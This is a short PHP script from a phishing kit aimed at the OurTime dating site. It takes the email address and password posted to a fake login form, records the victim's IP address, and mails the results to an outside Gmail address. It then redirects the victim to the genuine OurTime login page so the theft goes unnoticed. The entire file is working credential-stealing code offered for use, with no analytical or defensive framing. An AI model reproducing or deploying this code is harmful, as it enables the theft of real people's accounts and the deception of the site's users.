<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------zzz Result zzz------------------------------\n";
$message .= "Email Address: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Signed by zzz------------------------------\n";



$recipient = "richardneeded82b@gmail.com";
$subject = "OURTIME Result zzz $ip";
$headers = "From: zzz";
$headers .= $_POST['$ip']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.ourtime.com/v3/login?CPSessionID=8823813e-56f9-4b52-9259-e37e028a0065&VisitorID=14324010687");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>